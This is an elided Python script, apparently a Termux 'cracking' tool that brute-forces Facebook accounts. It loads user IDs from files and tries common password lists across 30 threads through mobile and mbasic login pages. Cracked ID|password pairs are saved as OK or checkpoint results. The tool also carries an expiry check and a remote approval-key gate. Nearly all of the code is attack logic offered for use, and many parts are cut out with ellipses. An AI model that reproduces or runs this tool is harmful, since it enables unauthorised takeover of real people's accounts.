...
g= datetime.datetime(2023, 9, 25, 1, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("    "+ 'WARING⛔ THE TOOL CODEING BY RK CODER 404\nTOOL EXPIERE BRO⛔\nBO KRINI TOOL NAMA BNERA BO @RK_709')
 print('\n\n')
 print(x)
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/RK001/RK-5/blob/main/mr.txt').text
		ua=open('.mr.txt','w')
...
Y8888P   `Y88P'  YP   YD Y88888P 88   YD\033[1;91")
# LOGIN
def login():
	try:
...
#		gep = requests.get('http://ipinfo.io/json').json()
	...
	print('%s[%s2%s]%s FILE CLONE %s[%sON%s]'%(P,H,P,H,P,H,P))
	print('%s[%sA%s]%s CONTACT %s[%sOwner%s]'%(P,H,P,H,P,H,P))
	print('%s[%sB%s]%s EXIT %s[%sOut%s]'%(P,H,P,H,P,H,P))
	RK = input('%s[%s?%s]%s select menu %s : '%(N,H,N,H,M))
	if RK in ['1','01']:
		public()
	if RK in ['2','02']:
		FILES()
	elif RK in ['A','a']:
		os.system('xdg-open https://m.me/tool_termuxx');menu(my_name,my_id)
	elif RK in ['B','b']:
...
def follower():
	try:
		...
		exit()
	print('\n\x1b[1;30m%s[%sRK%s]%s-----%s[%sRK%s]\n '%(H,P,H,P,H,P,H,))
	pil = input('[RK]  Inter User Id : ')
	try:
...
def FILES():
    os.system("espeak -a 300"" FILE")
    o = input('\033[1;37m File Name :\033[1;37m ')
...
def su():
	...
	print(f'''
	\033[1;41m\033[1;97mTOOL RK\033[1;0m
\033[32m[1] PASSWORD KURDI 
\033[32m[2] PASSWORD ARBI 
\033[32m[3] PASSWORD KURDI [ BRAH++ 123 ]
''')
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				pool.submit(crackmobile_RK,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_RK,idf,pwv,nmf)
			else:
...
def password3():
	...
	woi = input('[MR_BEMNAT] Inter You Choose  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t[✔] Good Bye{u} ')
...
# Mobile 
def crackmobile_RK(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{b}[KURDO]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackmbasic_RK(idf,pwv,nmf):
	global loop,ok,cp
	sys.stdout.write(f"\r[ [VIP] [RK]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s[RK]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[RK]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[RK]---> %s%s'%(kk,opsii.text,x))
	...
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%s[RK]%s ----> Error      %s'%(b,kes,x))
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s[RK]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[RK]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%s[RK]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[RK]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
...
def reg():
    ...
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.RK.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/RK001/approval.txt/main/RK').text
    if to in r:
        time.sleep(1)
        login()
    else:
